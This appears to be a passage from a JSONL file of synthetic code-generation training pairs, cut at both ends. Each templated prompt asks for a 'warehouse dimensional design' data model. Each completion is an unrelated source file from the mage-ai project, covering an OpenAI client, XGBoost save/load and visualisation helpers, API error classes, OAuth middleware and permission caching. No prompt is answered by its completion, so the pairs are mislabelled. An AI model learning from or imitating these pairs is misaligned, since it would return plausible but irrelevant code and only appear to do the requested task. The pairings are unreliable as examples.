'arguments': ['class']\n                }\n        \"\"\"\n        filled_prompt = PromptTemplate(\n            input_variables=list(variable_values.keys()),\n            template=prompt_template,\n        )\n        chain = LLMChain(llm=self.llm, prompt=filled_prompt)\n        if is_json_response:\n            resp = await chain.arun(variable_values)\n            # If the model response didn't start with\n            # '{' and end with '}' follwing in the JSON format,\n            # then we will add '{' and '}' to make it JSON format.\n            if not resp.startswith('{') and not resp.endswith('}'):\n                resp = f'{{{resp.strip()}}}'\n            if resp:\n                try:\n                    return json.loads(resp)\n                except json.decoder.JSONDecodeError as err:\n                    print(f'[ERROR] OpenAIClient.inference_with_prompt {resp}: {err}.')\n                    return resp\n            else:\n                return {}\n        return await chain.arun(variable_values)\n\n    def __parse_argument_value(self, value: str) -> str:\n        if value is None:\n            return None\n        # If model returned value does not contain '__' as we suggested in the tools\n        # then return the value as it is.\n        if '__' not in value:\n            return value\n        return value.lower().split('__')[1]\n\n    def __load_template_params(self, function_args: json):\n        block_type = BlockType(self.__parse_argument_value(function_args[BlockType.__name__]))\n        block_language = BlockLanguage(\n                            self.__parse_argument_value(\n                                function_args.get(BlockLanguage.__name__)\n                            ) or \"python\")\n        pipeline_type = PipelineType(\n                            self.__parse_argument_value(\n                                function_args.get(PipelineType.__name__)\n                            ) or \"python\")\n        config = {}\n        config['action_type'] = self.__parse_argument_value(\n                                    function_args.get(ActionType.__name__))\n        if config['action_type']:\n            if config['action_type'] in [\n                ActionType.FILTER,\n                ActionType.DROP_DUPLICATE,\n                ActionType.REMOVE,\n                ActionType.SORT\n            ]:\n                config['axis'] = Axis.ROW\n            else:\n                config['axis'] = Axis.COLUMN\n        config['data_source'] = self.__parse_argument_value(\n                                    function_args.get(DataSource.__name__))\n        return block_type, block_language, pipeline_type, config\n\n    async def find_block_params(\n            self,\n            block_description: str):\n        messages = [{'role': 'user', 'content': block_description}]\n        # Fetch response form API call with retries\n        # retry __chat_completion_request twice.\n        # If it still returns error, raise error in find_block_params.\n        # If not error anymore, proceed with rest of the code change.\n        max_retries = 2\n        attempt = 0\n        response = self.__chat_completion_request(messages)\n        while attempt <= max_retries and isinstance(response, Exception):\n            response = self.__chat_completion_request(messages)\n            attempt += 1\n        if isinstance(response, Exception):\n            raise Exception(\"Error in __chat_completion_request after retries: \" + str(response))\n        arguments = response.choices[0].message.tool_calls[0].function.arguments\n        if arguments:\n            function_args = json.loads(arguments)\n            block_type, block_language, pipeline_type, config = self.__load_template_params(\n                function_args)\n            output = {}\n            output['block_type'] = block_type\n            output['block_language'] = block_language\n            output['pipeline_type'] = pipeline_type\n            output['config'] = config\n            return output\n        else:\n            raise Exception('Failed to interpret the description as a block template.')\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/ai/openai_client.py", "language": "python", "complexity": "complex", "star_count": 8424, "quality_score": 0.9099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import base64\nimport io\nimport json\nimport os\nfrom typing import Any, Optional, Tuple\n\nfrom mage_ai.data_preparation.models.variables.constants import (\n    CONFIG_JSON_FILE,\n    MEDIA_IMAGE_VISUALIZATION_FILE,\n    UBJSON_MODEL_FILENAME,\n)\nfrom mage_ai.settings.server import MAX_OUTPUT_IMAGE_PREVIEW_SIZE\nfrom mage_ai.shared.environments import is_debug\n\n\n# Function to check if the booster is trained\ndef is_booster_trained(booster: Any, raise_exception: bool = True) -> bool:\n    # Check if the booster has been trained by checking for the existence of an attribute\n    # like 'feature_names'; this attribute is set upon training.\n    # If the model is not trained, accessing this attribute should raise an AttributeError.\n    try:\n        import xgboost as xgb\n\n        # If feature_names exists, it means the model has been trained.\n        return booster.num_boosted_rounds() >= 1\n    except xgb.core.XGBoostError as err:\n        message = f'XGBoost model is not trained. {err}'\n\n        if raise_exception:\n            raise Exception(message)\n\n        print(message)\n\n        # If the model is not trained, an AttributeError is raised.\n        return False\n\n\ndef load_model(\n    model_dir: str,\n    model_filename: str = UBJSON_MODEL_FILENAME,\n    config_filename: str = CONFIG_JSON_FILE,\n    raise_exception: bool = True,\n) -> Optional[Any]:\n    try:\n        import xgboost as xgb\n\n        model_path = os.path.join(model_dir, model_filename)\n        model = xgb.Booster()\n        model.load_model(model_path)\n\n        config_path = os.path.join(model_dir, config_filename)\n        with open(config_path, 'r') as file:\n            model_config = json.load(file)\n\n        model_config_str = json.dumps(model_config)\n        # Apply the saved configuration to the model\n        model.load_config(model_config_str)\n\n        return model\n    except Exception as err:\n        if raise_exception or is_debug():\n            raise err\n        print(f'[ERROR] XGBoost.load_model: {err}')\n\n    return None\n\n\ndef save_model(\n    booster: Any,\n    model_dir: str,\n    model_filename: str = UBJSON_MODEL_FILENAME,\n    config_filename: str = CONFIG_JSON_FILE,\n    image_filename: str = MEDIA_IMAGE_VISUALIZATION_FILE,\n    raise_exception: bool = True,\n) -> bool:\n    if not is_booster_trained(booster, raise_exception=raise_exception):\n        return False\n\n    os.makedirs(model_dir, exist_ok=True)\n\n    # Save detailed configuration of the model that includes all the hyperparameters\n    # and settings\n    model_path = os.path.join(model_dir, model_filename)\n    booster.save_model(model_path)\n\n    # Save the structure of the trees (for tree-based models like gradient boosting)\n    # along with some basic configurations necessary to understand the model structure itself\n    config_path = os.path.join(model_dir, config_filename)\n    with open(config_path, 'w') as f:\n        f.write(booster.save_config())\n\n    if image_filename:\n        image_path = os.path.join(model_dir, image_filename)\n        try:\n            create_tree_visualization(booster, image_path=image_path)\n        except Exception as err:\n            print(f'[ERROR] XGBoost.load_model: {err}')\n\n    return True\n\n\ndef create_tree_visualization(\n    model: Any,\n    image_path: Optional[str] = None,\n    max_render_size: int = MAX_OUTPUT_IMAGE_PREVIEW_SIZE,\n    max_trees: int = 12,\n    num_trees: int = 0,\n) -> Tuple[Optional[str], bool]:\n    try:\n        import xgboost as xgb\n        from PIL import Image\n\n        # Increase the maximum allowed image size to, say, 500 million pixels\n        Image.MAX_IMAGE_PIXELS = 1024 * 1024 * 500\n\n        trees_to_render = 0\n        n_trees = model.num_boosted_rounds()\n        if n_trees > max_trees or n_trees == 0:\n            trees_to_render = max_trees\n        elif n_trees >= 1 and num_trees < n_trees:\n            trees_to_render = num_trees\n        elif n_trees == max_trees:\n            trees_to_render = 0\n\n        graph = xgb.to_graphviz(\n            model, num_trees=trees_to_render, rankdir='TB', format='png'\n        )\n\n        if image_path:\n            # Remove the '.png' extension when specifying the filename\n            base_image_path = (\n                image_path.rsplit('.', 1)[0] if '.' in image_path else image_path\n            )\n\n            # Pass the adjusted filename without the extension\n            graph.render(filename=base_image_path, cleanup=True, format='png')\n            # Since the 'format' is 'png', Graphviz will output 'visualization.png'\n            return image_path, True\n\n        # Save the graph to a temporary PNG file (or use BytesIO directly with some adjustments)\n        png_bytes = graph.pipe(format='png')\n\n        # Convert PNG bytes to an PIL Image object\n        image = Image.open(io.BytesIO(png_bytes))\n\n        # Save or Display your image directly if needed\n        # image.show() # Uncomment to display the image directly\n\n        # Convert the PIL Image to a base64 string\n        buffered = io.BytesIO()\n        image.save(buffered, format='PNG')\n        img_str = base64.b64encode(buffered.getvalue()).decode()\n\n        buffered.seek(0)  # Reset pointer to the beginning of the buffer\n        file_size_bytes = buffered.getbuffer().nbytes\n        if file_size_bytes > max_render_size:\n            message = (\n                'XGBoost tree visualization created an image that exceeds '\n                f'{max_render_size} bytes (actual size is {file_size_bytes} bytes). '\n                'No preview will be shown in the browser. '\n                'To increase the preview limit, set the environment variable '\n                'MAX_OUTPUT_IMAGE_PREVIEW_SIZE to a larger byte size value.'\n            )\n            return message, False\n\n        return img_str, True\n    except Exception as err:\n        print(f'[ERROR] XGBoost.create_tree_visualization: {err}')\n        return str(err), False\n\n\ndef render_tree_visualization(\n    image_dir: str,\n    image_filename: Optional[str] = None,\n    max_render_size: Optional[int] = None,\n) -> Tuple[Optional[str], bool]:\n    # Load the model’s tree from a PNG file into base64 format\n    try:\n        image_filename = image_filename or MEDIA_IMAGE_VISUALIZATION_FILE\n        max_render_size = max_render_size or MAX_OUTPUT_IMAGE_PREVIEW_SIZE\n        image_path = os.path.join(image_dir, image_filename)\n\n        # Check for file size before opening\n        file_size_bytes = os.path.getsize(image_path)\n\n        if file_size_bytes > max_render_size:\n            message = (\n                'XGBoost tree visualization created an image that exceeds '\n                f'{max_render_size} bytes (actual size is {file_size_bytes} bytes). '\n                'No preview will be shown in the browser. '\n                'To increase the preview limit, set the environment variable '\n                'MAX_OUTPUT_IMAGE_PREVIEW_SIZE to a larger byte size value.'\n            )\n            return message, False\n\n        with open(image_path, 'rb') as image_file:\n            encoded_string = base64.b64encode(image_file.read()).decode('utf-8')\n        return encoded_string, True\n    except Exception as err:\n        print(f'[ERROR] XGBoost.render_tree_visualization: {err}')\n        return str(err), False\n\n\ndef create_tree_plot(model: Any, image_path: str, num_trees: int = 0) -> str:\n    try:\n        import matplotlib.pyplot as plt\n        import xgboost as xgb\n\n        plt.close('all')\n\n        plt.figure(dpi=300)\n        xgb.plot_tree(model, num_trees=5)\n        plt.tight_layout()\n\n        plt.savefig(image_path, dpi=300, bbox_inches='tight')\n\n        plt.close()\n\n        return image_path\n    except Exception as err:\n        print(f'[ERROR] XGBoost.create_tree_plot: {err}')\n        return str(err)\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/ai/utils/xgboost.py", "language": "python", "complexity": "complex", "star_count": 8424, "quality_score": 0.8799999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from mage_ai.api.operations.constants import OperationType\nfrom mage_ai.orchestration.db.models.oauth import Permission\nfrom mage_ai.shared.enum import StrEnum\n\n\nclass AttributeOperationType(StrEnum):\n    QUERY = 'query'\n    READ = 'read'\n    WRITE = 'write'\n\n\nclass AttributeType(StrEnum):\n    ALL = '__*MAGE*__'\n\n\nclass AuthorizeStatusType(StrEnum):\n    ALL = 'all'\n    FAILED = 'failed'\n    SUCCEEDED = 'succeeded'\n\n\nOPERATION_TYPE_TO_ACCESS_MAPPING = {\n  OperationType.ALL: Permission.Access.OPERATION_ALL,\n  OperationType.CREATE: Permission.Access.CREATE,\n  OperationType.DELETE: Permission.Access.DELETE,\n  OperationType.DETAIL: Permission.Access.DETAIL,\n  OperationType.LIST: Permission.Access.LIST,\n  OperationType.UPDATE: Permission.Access.UPDATE,\n}\n\nOPERATION_TYPE_DISABLE_TO_ACCESS_MAPPING = {\n  OperationType.ALL: Permission.Access.DISABLE_OPERATION_ALL,\n  OperationType.CREATE: Permission.Access.DISABLE_CREATE,\n  OperationType.DELETE: Permission.Access.DISABLE_DELETE,\n  OperationType.DETAIL: Permission.Access.DISABLE_DETAIL,\n  OperationType.LIST: Permission.Access.DISABLE_LIST,\n  OperationType.UPDATE: Permission.Access.DISABLE_UPDATE,\n}\n\nATTRIBUTE_OPERATION_TYPE_TO_ACCESS_MAPPING = {\n  AttributeOperationType.QUERY: Permission.Access.QUERY,\n  AttributeOperationType.READ: Permission.Access.READ,\n  AttributeOperationType.WRITE: Permission.Access.WRITE,\n}\n\nATTRIBUTE_OPERATION_TYPE_DISABLE_TO_ACCESS_MAPPING = {\n  AttributeOperationType.QUERY: Permission.Access.DISABLE_QUERY,\n  AttributeOperationType.READ: Permission.Access.DISABLE_READ,\n  AttributeOperationType.WRITE: Permission.Access.DISABLE_WRITE,\n}\n\nMETA_KEY_LIMIT = '_limit'\nMETA_KEY_OFFSET = '_offset'\n\nDOWNLOAD_TOKEN_LIFESPAN = 60  # Lifespan of generated download token in seconds\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/constants.py", "language": "python", "complexity": "simple", "star_count": 8424, "quality_score": 0.7899999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from typing import Dict, Optional\n\nfrom mage_ai.errors.constants import ErrorCode\nfrom mage_ai.errors.models import ErrorDetails\n\n\nclass ApiError(Exception):\n    UNAUTHORIZED_ACCESS = dict(\n        code=ErrorCode.CODE_403.value,\n        message='Unauthorized access.',\n        type='unauthorized_access',\n    )\n\n    RESOURCE_ERROR = dict(\n        code=ErrorCode.CODE_400.value,\n        message='API resource error.',\n        type='api_resource_error',\n    )\n    RESOURCE_INVALID = dict(\n        code=ErrorCode.CODE_400.value,\n        message='Record is invalid.',\n        type='record_invalid',\n    )\n    RESOURCE_NOT_FOUND = dict(\n        code=ErrorCode.CODE_404.value,\n        message='Record not found.',\n        type='record_not_found',\n    )\n\n    INVALID_API_KEY = dict(\n        code=ErrorCode.CODE_401.value,\n        message='Invalid API key.',\n        type='invalid_api_key',\n    )\n    EXPIRED_OAUTH_TOKEN = dict(\n        code=ErrorCode.CODE_401.value,\n        message='Expired OAuth token.',\n        type='expired_oauth_token',\n    )\n    INVALID_OAUTH_TOKEN = dict(\n        code=ErrorCode.CODE_401.value,\n        message='Invalid OAuth token.',\n        type='invalid_oauth_token',\n    )\n\n    def __init__(self, opts: Optional[Dict] = None):\n        if opts:\n            self.code = opts.get('code')\n            self.errors = opts.get('errors')\n            self.message = opts.get('message')\n            self.type = opts.get('type')\n\n    def to_dict(self, **kwargs) -> Dict:\n        errors = self.errors\n        if not isinstance(errors, list):\n            errors = str(errors).split('\\n')\n\n        return ErrorDetails.load(\n            code=self.code,\n            errors=errors,\n            message=self.message,\n            type=self.type,\n        ).to_dict()\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/errors.py", "language": "python", "complexity": "simple", "star_count": 8424, "quality_score": 0.82, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nfrom json.decoder import JSONDecodeError\n\nfrom tornado.web import RequestHandler\n\nfrom mage_ai.api.errors import ApiError\nfrom mage_ai.api.utils import authenticate_client_and_token, parse_cookie_header\nfrom mage_ai.authentication.oauth2 import decode_token\nfrom mage_ai.orchestration.db.models.oauth import Oauth2Application\nfrom mage_ai.server.api.constants import (\n    COOKIE_OAUTH_TOKEN,\n    HEADER_API_KEY,\n    HEADER_OAUTH_TOKEN,\n    URL_PARAMETER_API_KEY,\n)\nfrom mage_ai.settings import OAUTH2_APPLICATION_CLIENT_ID, REQUIRE_USER_AUTHENTICATION\nfrom mage_ai.shared.requests import get_bearer_auth_token_from_headers\n\n\nclass OAuthMiddleware(RequestHandler):\n    def initialize(self, **kwargs) -> None:\n        self.bypass_oauth_check = kwargs.get('bypass_oauth_check', False)\n\n    def prepare(self):\n        self.request.__setattr__('current_user', None)\n        self.request.__setattr__('error', None)\n        self.request.__setattr__('oauth_client', None)\n        self.request.__setattr__('oauth_token', None)\n\n        if not REQUIRE_USER_AUTHENTICATION:\n            return\n\n        if self.bypass_oauth_check:\n            return\n\n        api_key = self.request.headers.get(HEADER_API_KEY, None)\n        if not api_key:\n            if self.request.method == 'POST':\n                try:\n                    api_key = json.loads(\n                        self.request.body).get(URL_PARAMETER_API_KEY)\n                except (JSONDecodeError, UnicodeDecodeError):\n                    # UnicodeDecodeError happens when there is invalid characters in the\n                    # file upload when creating a new feature set\n                    api_key = self.request.query_arguments.get(\n                        URL_PARAMETER_API_KEY)\n            else:\n                api_key = self.request.query_arguments.get(\n                    URL_PARAMETER_API_KEY)\n\n        if api_key:\n            if isinstance(api_key, list):\n                api_key = api_key[0]\n            if not isinstance(api_key, str):\n                api_key = api_key.decode()\n\n        token_from_header = self.request.headers.get(HEADER_OAUTH_TOKEN, None)\n        if not token_from_header:\n            token_from_header = self.request.headers.get('Authorization')\n            if token_from_header:\n                token_from_header = get_bearer_auth_token_from_headers(self.request.headers)\n            else:\n                token_from_header = self.request.query_arguments.get('HTTP_AUTHORIZATION', None)\n\n        cookies = parse_cookie_header(self.request.headers.get('Cookie', ''))\n\n        if api_key:\n            oauth_client = Oauth2Application.query_client(api_key)\n\n            self.request.__setattr__('oauth_client', oauth_client)\n            if not oauth_client:\n                self.request.__setattr__('error', ApiError.INVALID_API_KEY)\n                self.set_status(ApiError.INVALID_API_KEY['code'])\n            elif oauth_client.client_id != OAUTH2_APPLICATION_CLIENT_ID:\n                self.request.__setattr__('error', ApiError.INVALID_API_KEY)\n                self.set_status(ApiError.INVALID_API_KEY['code'])\n            else:\n                should_check = False\n                oauth_token = None\n                if token_from_header:\n                    oauth_token, valid = authenticate_client_and_token(\n                        oauth_client.id,\n                        token_from_header,\n                    )\n                    should_check = True\n                elif COOKIE_OAUTH_TOKEN in cookies:\n                    token_data = decode_token(cookies[COOKIE_OAUTH_TOKEN])\n                    if 'token' in token_data:\n                        oauth_token, valid = authenticate_client_and_token(\n                            oauth_client.id,\n                            decode_token(cookies[COOKIE_OAUTH_TOKEN])['token'],\n                        )\n                    should_check = True\n\n                if should_check:\n                    if oauth_token:\n                        if valid:\n                            self.request.__setattr__('oauth_token', oauth_token)\n                            self.request.__setattr__(\n                                'current_user', oauth_token.user)\n                        else:\n                            self.request.__setattr__(\n                                'error', ApiError.EXPIRED_OAUTH_TOKEN)\n                            self.set_status(ApiError.EXPIRED_OAUTH_TOKEN['code'])\n                    else:\n                        self.request.__setattr__(\n                            'error', ApiError.INVALID_OAUTH_TOKEN)\n                        self.set_status(ApiError.INVALID_OAUTH_TOKEN['code'])\n        else:\n            self.request.__setattr__('error', ApiError.INVALID_API_KEY)\n            self.set_status(ApiError.INVALID_API_KEY['code'])\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/middleware.py", "language": "python", "complexity": "medium", "star_count": 8424, "quality_score": 0.8799999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design with SQL analytics queries\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "from typing import List\n\nfrom mage_ai.api.constants import AttributeOperationType\nfrom mage_ai.api.operations.constants import OperationType\nfrom mage_ai.authentication.permissions.constants import EntityName\nfrom mage_ai.orchestration.db import safe_db_query\nfrom mage_ai.orchestration.db.models.oauth import (\n    Permission,\n    Role,\n    RolePermission,\n    UserRole,\n)\n\nCONTEXT_DATA_KEY_USER_PERMISSIONS = '__user_permissions'\nCONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED = '__user_permissions_granted'\nCONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED_KEY_OPERATIONS = '__operations'\nCONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED_KEY_ATTRIBUTE_OPERATIONS = '__attribute_operations'\n\n\nclass ResultSetMixIn:\n    @classmethod\n    def entity_name_uuid(self) -> EntityName:\n        model_name = self.model_name()\n        if model_name in EntityName._value2member_map_:\n            return EntityName(model_name)\n\n        return None\n\n    @safe_db_query\n    async def load_and_cache_user_permissions(self) -> List[Permission]:\n        # This will fetch the user permissions and store it on the context data\n        # so that repeat policy user permission validations won’t keep querying the\n        # database for permissions.\n        if not self.current_user:\n            return\n\n        permissions = self.result_set().context.data.get(CONTEXT_DATA_KEY_USER_PERMISSIONS)\n        if permissions:\n            return permissions\n\n        query = (\n            Permission.\n            select(\n                Permission.access,\n                Permission.entity,\n                Permission.entity_id,\n                Permission.entity_name,\n                Permission.entity_type,\n                Permission.id,\n                Permission.options,\n            ).\n            join(\n                RolePermission,\n                RolePermission.permission_id == Permission.id).\n            join(\n                Role,\n                Role.id == RolePermission.role_id).\n            join(\n                UserRole,\n                UserRole.role_id == Role.id).\n            filter(UserRole.user_id == self.current_user.id)\n        )\n\n        permissions = []\n\n        for row in query.all():\n            permission = Permission()\n            permission.access = row.access\n            permission.entity = row.entity\n            permission.entity_id = row.entity_id\n            permission.entity_name = row.entity_name\n            permission.entity_type = row.entity_type\n            permission.id = row.id\n            permission.options = row.options\n            permissions.append(permission)\n\n        self.result_set().context.data[CONTEXT_DATA_KEY_USER_PERMISSIONS] = permissions\n\n        return permissions\n\n    async def load_cached_permission_authorization(\n        self,\n        operation: OperationType,\n        attribute_operation_type: AttributeOperationType = None,\n        resource_attribute: str = None,\n    ) -> bool:\n        authorized = None\n\n        permissions_granted = self.result_set().context.data.get(\n            CONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED,\n        ) or {}\n\n        if not permissions_granted:\n            return authorized\n\n        key = CONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED_KEY_OPERATIONS\n        if attribute_operation_type and resource_attribute:\n            key = CONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED_KEY_ATTRIBUTE_OPERATIONS\n\n        if key not in permissions_granted:\n            return authorized\n\n        entity_name = self.entity_name_uuid()\n        if entity_name not in permissions_granted[key]:\n            return authorized\n\n        if operation not in permissions_granted[key][entity_name]:\n            return authorized\n\n        if attribute_operation_type and resource_attribute:\n            if attribute_operation_type not in permissions_granted[key][entity_name][operation]:\n                return authorized\n\n            if resource_attribute not in \\\n                    permissions_granted[key][entity_name][operation][attribute_operation_type]:\n\n                return authorized\n\n            authorized = permissions_granted[key][entity_name][operation][attribute_operation_type][\n                resource_attribute\n            ] or False\n        else:\n            authorized = permissions_granted[key][entity_name][operation] or False\n\n        return authorized\n\n    async def cache_permission_authorization(\n        self,\n        authorized: bool,\n        operation: OperationType,\n        attribute_operation_type: AttributeOperationType = None,\n        resource_attribute: str = None,\n    ) -> None:\n        permissions_granted = self.result_set().context.data.get(\n            CONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED,\n        ) or {}\n\n        key = CONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED_KEY_OPERATIONS\n        if attribute_operation_type and resource_attribute:\n            key = CONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED_KEY_ATTRIBUTE_OPERATIONS\n\n        if key not in permissions_granted:\n            permissions_granted[key] = {}\n\n        entity_name = self.entity_name_uuid()\n        if entity_name not in permissions_granted[key]:\n            permissions_granted[key][entity_name] = {}\n\n        if operation not in permissions_granted[key][entity_name]:\n            permissions_granted[key][entity_name][operation] = {}\n\n        if attribute_operation_type and resource_attribute:\n            if attribute_operation_type not in permissions_granted[key][entity_name][operation]:\n                permissions_granted[key][entity_name][operation][attribute_operation_type] = {}\n\n            if resource_attribute not in \\\n                    permissions_granted[key][entity_name][operation][attribute_operation_type]:\n\n                permissions_granted[key][entity_name][operation][attribute_operation_type][\n                    resource_attribute\n                ] = None\n\n            permissions_granted[key][entity_name][operation][attribute_operation_type][\n                resource_attribute\n            ] = authorized\n        else:\n            permissions_granted[key][entity_name][operation] = authorized\n\n        self.result_set().context.data[CONTEXT_DATA_KEY_USER_PERMISSIONS_GRANTED] = \\\n            permissions_granted\n", "metadata": {"source": "github.com/mage-ai/mage-ai", "file_path": "mage_ai/api/mixins/result_set.py", "language": "python", "complexity": "medium", "star_count": 8424, "quality_score": 0.82, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "data_modeling", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create data model for warehouse dimensional design\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import importlib\nimport importlib.util\nimport inspect\nfrom collections import UserList\nfrom typing import Any, Callable, Dict, List, Union\n\nimport dateutil.parser\nimport inflection\n\nfrom mage_ai import settings\nfrom mage_ai.api.api_context import ApiContext\nfrom mage_ai.api.errors import ApiError\nfrom mage_ai.api.monitors.BaseMonitor import BaseMonitor\nfrom mage_ai.api.operations.constants import (\n    COOKIE_PREFIX,\n    CREATE,\n    DELETE,\n    DETAIL,\n    FILE_KEY_NAME,\n    LIST,\n    META_KEY_FORMAT,\n    READ,\n    UPDATE,\n    WRITE,\n)\nfrom mage_ai.api.parsers.BaseParser import BaseParser\nfrom mage_ai.api.presenters.BasePresenter import CustomDict, CustomList\nfrom mage_ai.api.resources.BaseResource import BaseResource\nfrom mage_ai.api.result_set import ResultSet\nfrom mage_ai.authentication.permissions.constants import EntityName\nfrom mage_ai.data_preparation.models.global_hooks.models import (\n    GlobalHooks,\n    Hook,\n    HookCondition,\n    HookOperation,\n    HookStage,\n    HookStrategy,\n)\nfrom mage_ai.data_preparation.models.project import Project\nfrom mage_ai.data_preparation.models.project.constants import FeatureUUID\nfrom mage_ai.orchestration.db import db_connection\nfrom mage_ai.orchestration.db.errors import DoesNotExistError\nfrom mage_ai.settings import REQUIRE_USER_PERMISSIONS\nfrom mage_ai.shared.array import flatten\nfrom mage_ai.shared.environments import is_debug\nfrom mage_ai.shared.hash import ignore_keys, merge_dict\nfrom mage_ai.shared.strings import classify\n\n\ndef singularize(name):\n    return inflection.singularize(name)\n\n\nclass BaseOperation:\n    def __init__(self, **kwargs):\n        self.action = kwargs.get('action')\n        self.files = kwargs.get('files', {})\n        self.pk = kwargs.get('pk')\n        self.headers = kwargs.get('headers', {})\n        self.meta = kwargs.get('meta', {})\n        self.oauth_client = kwargs.get('oauth_client')\n        self.oauth_token = kwargs.get('oauth_token')\n        self.options = kwargs.get('options', {})\n        self.payload = kwargs.get('payload') or {}\n        self.payload_mutated = None\n        self._query = kwargs.get('query', {}) or {}\n        self.resource = kwargs.get('resource')\n        self.resource_parent = kwargs.get('resource_parent')\n        self.resource_parent_id = kwargs.get('resource_parent_id')\n        self.user = kwargs.get('user')\n        self.context = ApiContext()\n        self.__combined_options_attr = None\n        self.__presentation_format_attr = None\n        self.__updated_options_attr = None\n        self.__flags = dict()\n\n    async def execute(self):\n        db_connection.start_cache()\n\n        presented_init = None\n        metadata = None\n        result = None\n        resource_parent = None\n\n        resource_key = 'resource'\n        if LIST == self.action:\n            resource_key = 'resources'\n\n        response = {}\n        try:\n            already_validated = False\n\n            result = await self.__executed_result()\n            presented_init = await self.__present_results(result)\n\n            if isinstance(result, ResultSet):\n                metadata = result.metadata\n\n            if result:\n                if isinstance(result, list) or isinstance(result, ResultSet):\n                    sample = result[0]\n                else:\n                    sample = result\n                if hasattr(sample, 'model_options'):\n                    if sample.model_options:\n                        resource_parent = sample.model_options.get('parent_model')\n\n            results_altered = self.__run_hooks_after(\n                condition=HookCondition.SUCCESS,\n                metadata=metadata,\n                operation_resource=result,\n                payload=self.payload_mutated,\n                resource_parent=resource_parent,\n                **{\n                    resource_key: presented_init,\n                },\n            )\n\n            metadata = results_altered['metadata']\n            presented = results_altered[resource_key]\n\n            if isinstance(presented, CustomDict) or isinstance(presented, CustomList):\n                already_validated = presented.already_validated\n\n            presented_results = []\n            resource_attributes = []\n\n            presented_is_list = issubclass(type(presented), list)\n            if presented_is_list:\n                presented_results = presented\n                resource_attributes = flatten([d.keys() for d in presented])\n            else:\n                presented_results = [presented]\n                resource_attributes = presented.keys()\n\n            resource_attributes = list(set(resource_attributes))\n\n            if issubclass(type(result), list) or issubclass(type(result), UserList):\n                results = result\n            else:\n                results = [result]\n\n            presented_results_count = len(presented_results)\n            presented_results_parsed = []\n            for idx, res in enumerate(results):\n                updated_options = await self.__updated_options()\n                policy = self.__policy_class()(res, self.user, **updated_options)\n\n                presented_result = None\n                if idx < presented_results_count:\n                    presented_result = presented_results[idx]\n\n                if already_validated:\n                    presented_results_parsed.append(presented_result)\n                    continue\n\n                # Skip this if result has already been validated\n                def _build_authorize_attributes(parsed_value: Any, policy=policy) -> Callable:\n                    return policy.authorize_attributes(\n                        READ,\n                        parsed_value.keys(),\n                        api_operation_action=self.action,\n                    )\n\n                parser = None\n                parser_class = self.__parser_class()\n                if parser_class:\n                    parser = parser_class(\n                        resource=res,\n                        current_user=self.user,\n                        policy=policy,\n                        **updated_options,\n                    )\n\n                if parser:\n                    presented_result_parsed = await parser.parse_read_attributes_and_authorize(\n                        presented_result,\n                        _build_authorize_attributes,\n                        **updated_options,\n                    )\n                    presented_results_parsed.append(presented_result_parsed)\n                else:\n                    await policy.authorize_attributes(\n                        READ,\n                        resource_attributes,\n                        api_operation_action=self.action,\n                    )\n                    presented_results_parsed.append(presented_result)\n\n            response_key = (\n                self.resource if LIST == self.action else self.__resource_name_singular()\n            )\n\n            if presented_is_list:\n                response[response_key] = presented_results_parsed\n            else:\n                response[response_key] = (\n                    presented_results_parsed[0]\n                    if len(\n                        presented_results_parsed,\n                    )\n                    >= 1\n                    else presented_results_parsed\n                )\n\n            response['metadata'] = metadata\n\n            if settings.DEBUG:\n                debug_payload = {}\n                debug_payload[self.__resource_name_singular()] = merge_dict(\n                    self.payload.get(self.__resource_name_singular(), {}),\n                    {\n                        'file': None,\n                    },\n                )\n                response['debug'] = {\n                    'action': self.action,\n                    'meta': self.meta,\n                    'options': self.options,\n                    'payload': merge_dict(self.payload, debug_payload),\n                    'pk': self.pk,\n                    'presentation_format': self.__presentation_format(),\n                    'query': 